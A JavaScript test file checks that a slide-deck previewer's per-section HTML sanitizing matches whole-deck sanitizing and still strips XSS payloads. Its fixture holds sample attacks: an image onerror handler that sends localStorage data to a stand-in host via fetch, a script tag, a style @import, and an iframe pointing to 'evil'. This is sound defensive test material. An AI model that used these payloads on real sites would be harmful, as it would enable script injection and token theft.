import { describe, expect, it } from 'vitest';
import { sanitizeSlideHtml } from '../lib/sanitize-slide-html.js';
import { splitSections } from './deck-preview.js';

// renderDeck's incremental-sanitize hot path (deck-preview.js) sanitizes each
// <section> in isolation and reuses the prior render's sanitized output for any
// section whose RAW html is unchanged — instead of running DOMPurify over the whole
// deck every keystroke (~28ms on a 50-slide edit, half the per-render cost, enough
// to push a big-deck edit past the frame scheduler's 50ms heavy backstop).
//
// This is only sound if per-section sanitize is BYTE-IDENTICAL to whole-deck
// sanitize. It is — DOMPurify treats each top-level <section> independently and the
// allowlisted <section> boundaries survive — and these tests lock that invariant so
// a future sanitizer/allowlist change that broke section-locality would fail here,
// not silently corrupt a cached preview.

// A representative multi-section deck: normal prose, every #616 killer payload, and
// the legitimate engine outputs that must survive (chart SVG, KaTeX, url() styles,
// a mermaid fence) — one per section, so a section-boundary or cross-section
// sanitize dependency would surface as a mismatch.
const SECTIONS = [
	'<section id="1"><h1>Title</h1><p>Plain <strong>prose</strong> and a <a href="https://x">link</a>.</p></section>',
	'<section id="2"><p>ok</p><img src=x onerror="fetch(\'//e/?\'+localStorage.k)"><script>steal()</script></section>',
	'<section id="3"><div class="funnel-figure" style="--funnel-stages:3"><svg viewBox="0 0 1 1" role="img"><path d="M0 0"></path></svg></div></section>',
	'<section id="4"><span class="katex"><span class="katex-mathml">x</span></span><style>@import url(//evil)</style></section>',
	'<section id="5"><div class="lattice-bg" style="background-image:url(\'/a.svg\')"></div><iframe src="//evil"></iframe></section>',
	'<section id="6"><pre class="language-mermaid"><code>graph TD;A--&gt;B</code></pre></section>',
];

describe('renderDeck incremental sanitize — per-section == whole-deck', () => {
	it('sanitizing each section then splitting equals splitting then sanitizing the whole', () => {
		const whole = SECTIONS.join('\n');
		const wholeThenSplit = splitSections(sanitizeSlideHtml(whole));
		const splitThenEach = splitSections(whole).map((s) => sanitizeSlideHtml(s));
		expect(splitThenEach).toEqual(wholeThenSplit);
	});

	it('still kills the killer payloads at the section level', () => {
		const perSection = splitSections(SECTIONS.join('\n')).map((s) => sanitizeSlideHtml(s));
		const joined = perSection.join('\n');
		expect(joined).not.toMatch(/onerror/i);
		expect(joined).not.toMatch(/<script/i);
		expect(joined).not.toMatch(/<style/i);
		expect(joined).not.toMatch(/<iframe/i);
	});

	it('still preserves legitimate engine output at the section level', () => {
		const perSection = splitSections(SECTIONS.join('\n')).map((s) => sanitizeSlideHtml(s));
		const joined = perSection.join('\n');
		expect(joined).toContain('<svg');
		expect(joined).toContain('--funnel-stages:3');
		expect(joined).toContain('class="katex"');
		expect(joined).toContain("background-image:url('/a.svg')");
		expect(joined).toContain('language-mermaid');
	});

	it('a cache hit (reusing a prior sanitized section) equals a fresh sanitize — DOMPurify is deterministic', () => {
		// The cache stores sanitizeSlideHtml(raw) keyed by the raw section string; a
		// reused entry must equal recomputing it, or an unedited slide would drift.
		for (const s of SECTIONS) {
			expect(sanitizeSlideHtml(s)).toBe(sanitizeSlideHtml(s));
		}
	});
});
